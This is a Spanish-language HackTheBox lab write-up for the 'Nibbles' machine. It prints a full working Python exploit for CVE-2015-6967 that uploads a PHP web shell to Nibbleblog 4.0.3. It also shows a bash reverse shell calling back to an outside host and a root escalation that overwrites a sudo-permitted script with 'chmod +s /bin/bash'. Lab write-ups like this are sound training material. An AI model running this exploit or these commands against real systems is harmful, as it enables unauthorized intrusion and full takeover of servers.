---
date: 2023-07-28 12:00:00
layout: post
title: Nibbles Writeup
subtitle: Writeup de la máquina Nibbles de la plataforma HackTheBox
description: Realizaré la máquina Nibbles explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: /assets/img/machines/Nibbles/Nibbles.png
optimized_image: /assets/img/machines/Nibbles/Nibbles.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Linux
  - Easy
  - CVE
  - Arbitrary File Upload
  - RCE
  
author: FredBrave
---
# Enumeración
Empezamos la enumeración haciendo un escaneo a todos los puertos de la máquina víctima, una vez encontrados los puertos abiertos intentaremos un escaneo mucho más exhaustivo hacia estos puertos abiertos. Esto es para encontrar versiones o vulnerabilidades de dichos servicios corriendo en estos puertos.

```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.144.174 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 10:34 EDT
Nmap scan report for 10.129.144.174
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.02 seconds

sudo nmap -p22,80 -sCV 10.129.144.174 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 10:38 EDT
Nmap scan report for 10.129.144.174
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.48 seconds
```
Hemos encontrado los puertos 22 y 80 abiertos. El 22 (SSH) es vulnerable a Username Enumeration, pero este no lo explotaremos por ahora.

```bash
searchsploit OpenSSH 7.2
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                                           | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                                                                                                          | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                                                  | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                                                     | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                                                     | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                                     | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                                                                    | linux/remote/40113.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Revisaré el puerto 80 en busca de alguna abertura de seguridad. Al buscarlo en el navegador me encuentro con lo siguiente.

<img class="img" src="/assets/img/machines/Nibbles/2.png" width="1000">

No hay nada interesante a primera vista, pero si se ve el código fuente podemos encontrar un comentario de nuestro interes.

<img class="img" src="/assets/img/machines/Nibbles/3.png" width="800">

Tenemos un posible directorio, lo buscamos y encontramos lo siguiente.

<img class="img" src="/assets/img/machines/Nibbles/4.png" width="1200">

Tenemos un gestor de contenido usado en la web, probaremos fuzzear la web desde este directorio para intentar conseguir más rutas.

```bash
ffuf -u http://10.129.144.174/nibbleblog/FUZZ -w /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.144.174/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Utilidades/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 214ms]
    * FUZZ: themes

[Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 122ms]
    * FUZZ: admin

[Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 119ms]
    * FUZZ: plugins

[Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 116ms]
    * FUZZ: README

[Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 113ms]
    * FUZZ: languages

[Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 6090ms]
    * FUZZ: content

[Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 141ms]
    * FUZZ: 

:: Progress: [220545/220545] :: Job [1/1] :: 810 req/sec :: Duration: [0:04:20] :: Errors: 0 ::
```
Encontramos muchos directorios interesantes, de entre estos el directorio "content" revisándolo tiene mucha información de nuestro interés.

Revisando a profundidad este directorio encontramos en la siguiente ruta "/content/private/config.xml" dos nombres de usuarios.

<img class="img" src="/assets/img/machines/Nibbles/5.png" width="1200">

También encontramos la versión del Nibbleblog en el README.

# Explotacion

<img class="img" src="/assets/img/machines/Nibbles/6.png" width="800">

Intentaré logearme como admin en `admin.php`, por alguna razón la fuerza bruta no me funcionaba, pero al intentar con la clave `nibbles` logre ingresar como admin al Nibbleblog.

<img class="img" src="/assets/img/machines/Nibbles/8.png" width="1400">

Ya tenemos credenciales válidas. Al buscar por la versión del Nibbleblog encontramos que es vulnerable a un `Arbitrary File Upload`.

```bash
searchsploit Nibbleblog 4.0.3
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                    | php/remote/38489.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Buscando la vulnerabilidad en internet y analizando otros exploits, logre entender el exploit y recrear uno propio. Estará subido en mi <a href='https://github.com/FredBrave/CVE-2015-6967'>github</a> si les interesa.

```python3
#!/usr/bin/python3
#CVE: CVE-2015-6967
# Author: FredBrave


import signal, sys, requests, optparse

def Exiting(sig, frame):
    print("\nExiting...\n")
    sys.exit(1)

#CTRL +C 
signal.signal(signal.SIGINT, Exiting)

def helPanel():
    print("python3 exploit.py --url http://10.10.10.10/ --username admin --password 123456")


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('--url', dest='target', help='Url Target')
    parser.add_option('--username', dest='user', help='User to login')
    parser.add_option('--password', dest='password', help='Password to login')
    (options, arguments) = parser.parse_args()
    if not options.target:
        helPanel()
        parser.error("[-] Please indicate the url of target --url, for more information... --help")
    if not options.user:
        helPanel()
        parser.error("[-] Please indicate the username --username, for more information... --help")
    if not options.password:
        helPanel()
        parser.error("[-] Please indicate the password, for more information... --help")
    return options

def login(target, username, password):
    login_url = f'{target}/nibbleblog/admin.php'
    data = {"username": username, "password": password}
    try:
        r = SESSION.post(login_url, data, timeout=10, verify=False)
        if 'Dashboard' in r.text:
            print("[ + ] Login Succesfuly!")
        else:
            sys.exit("[ ! ] Login failed, exiting")
    except Exception as e:
        sys.exit("[-] Exception: {}".format(e))

def execute_commands(target, username, password):
    payload = '<?php echo shell_exec($_GET["cmd"]); ?>'
    login(target, username, password)
    image_url = f"{target}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
    exec_path = f"{target}/nibbleblog/content/private/plugins/my_image/image.php"
    try:
          req = SESSION.get(image_url, timeout=10, verify=False)
    except Exception as e:
        sys.exit("[-] Exception: {}".format(e))
    if 'Plugins :: My image' in req.text:
        print("[+] Uploading shell...")

        data = {
            "plugin": (None, 'my_image'), "title": (None, 'My image'), "position": (None, 4), "caption": "",
            "image": ('doesnt_matter.php', payload, "application/x-php", {'Content-Disposition': 'form-data'}),
            "image_resize": (None, 1), "image_width": (None, 200), "image_height": (None, 200), "image_option": (None, 'auto')
        }
        
        try:
            upload = SESSION.post(url=image_url, files=data, timeout=10, verify=False)

            if 'Changes has been saved successfully' in upload.text:
                print(f"[ * ] Shell has been uploaded!")
                print(75 * '-')
                while True:
                    params = {"cmd": input("cmd> ")}
                    command = SESSION.get(url=exec_path, params=params, verify=False)
                    print(command.text)
            else:
                sys.exit("[ - ] Shell upload failed, exiting")
        except Exception as e:
            sys.exit("[-] Exception: {}".format(e))
    else:
        sys.exit("Error uploading shell, exiting!")    



def main():
    options = get_arguments()
    target = options.target
    username = options.user
    password = options.password
    execute_commands(target, username, password)

if __name__ == "__main__":
    SESSION = requests.Session()
    main()
```
# Exploit Explicacion

Ahora explicaré las partes más importantes del exploit.
```python3
def main():
    options = get_arguments()
    target = options.target
    username = options.user
    password = options.password
    execute_commands(target, username, password)

if __name__ == "__main__":
    SESSION = requests.Session()
    main()
```
Aquí lo que hacemos es crear el main el cual obtendrá toda la información a través de parámetros utilizando la función llamada get\_arguments, una vez obtenida la información ejecuta la función execute\_commands. Antes de ejecutar main se crea una SESSION para las peticiones web. Esto es para que al logearme como el usuario la sesión se mantenga.

```python3
def login(target, username, password):
    login_url = f'{target}/nibbleblog/admin.php'
    data = {"username": username, "password": password}
    try:
        r = SESSION.post(login_url, data, timeout=10, verify=False)
        if 'Dashboard' in r.text:
            print("[ + ] Login Succesfuly!")
        else:
            sys.exit("[ ! ] Login failed, exiting")
    except Exception as e:
        sys.exit("[-] Exception: {}".format(e))
```
Esta parte lo que hace es obtenerme un login como usuario en el nibbleblog a través de las credenciales proporcionadas por el usuario. Tener en cuenta que esto funciona debido a que en el main creamos ya una petición con la función SESSION y que ahora estamos reutilizando dicha petición.

```python3
def execute_commands(target, username, password):
    payload = '<?php echo shell_exec($_GET["cmd"]); ?>'
    login(target, username, password)
    image_url = f"{target}/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
    exec_path = f"{target}/nibbleblog/content/private/plugins/my_image/image.php"
    try:
          req = SESSION.get(image_url, timeout=10, verify=False)
    except Exception as e:
        sys.exit("[-] Exception: {}".format(e))
    if 'Plugins :: My image' in req.text:
        print("[+] Uploading shell...")

        data = {
            "plugin": (None, 'my_image'), "title": (None, 'My image'), "position": (None, 4), "caption": "",
            "image": ('doesnt_matter.php', payload, "application/x-php", {'Content-Disposition': 'form-data'}),
            "image_resize": (None, 1), "image_width": (None, 200), "image_height": (None, 200), "image_option": (None, 'auto')
        }
        
        try:
            upload = SESSION.post(url=image_url, files=data, timeout=10, verify=False)

            if 'Changes has been saved successfully' in upload.text:
                print(f"[ * ] Shell has been uploaded!")
                print(75 * '-')
                while True:
                    params = {"cmd": input("cmd> ")}
                    command = SESSION.get(url=exec_path, params=params, verify=False)
                    print(command.text)
            else:
                sys.exit("[ - ] Shell upload failed, exiting")
        except Exception as e:
            sys.exit("[-] Exception: {}".format(e))
    else:
        sys.exit("Error uploading shell, exiting!")
```
Esta es la parte más importante del exploit, es la que se encarga de ejecutar el RCE. Lo primero que hace es definir varias rutas y un payload además se llama a la función login para obtener una sesión como admin. Lo siguiente es subir el típico payload `<?php system($_GET['cmd']); ?>` haciéndolo pasar como una imagen. Una vez subido mandaremos una petición hacia la ruta donde se subió con el comando que queremos ejecutar. Esto se ejecutara indefinidamente.

# Shell como nibbler

Una vez entendido el exploit lo ejecutaremos para lograr un RCE.

```bash
python3 CVE-2015-6967.py --url http://10.129.144.174/ --username admin --password nibbles
[ + ] Login Succesfuly!
[+] Uploading shell...
[ * ] Shell has been uploaded!
---------------------------------------------------------------------------
cmd>
```
Me enviaré una shell a mi puerto 443.

```bash
cmd> bash -c 'bash -i >& /dev/tcp/10.10.16.31/443 0>&1'

.....

nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.144.174] 51348
bash: cannot set terminal process group (1354): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```
# Shell como root
Enumerando encuentro que puedo ejecutar como root `/home/nibbler/personal/stuff/monitor.sh`.

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Intentando obtener más información sobre el archivo encuentro que este no existe. Al buscar más en detalle en el directorio Home de nibbler encuentro un archivo zip el cual extraigo.

```bash
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ ls
personal  personal.zip  user.txt
```
Ahora al revisar el script encuentro que tengo todos los permisos por lo cual solo cambio el contenido por `chmod +s /bin/bash`.

```bash
nibbler@Nibbles:/home/nibbler$ ls -la personal/stuff/monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ echo "chmod +s /bin/bash" > personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$
```
Ahora solo ejecutamos el script.

```bash
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ bash -p
bash-4.3# whoami
root
bash-4.3#
```
Hemos pwneado la maquina!!!

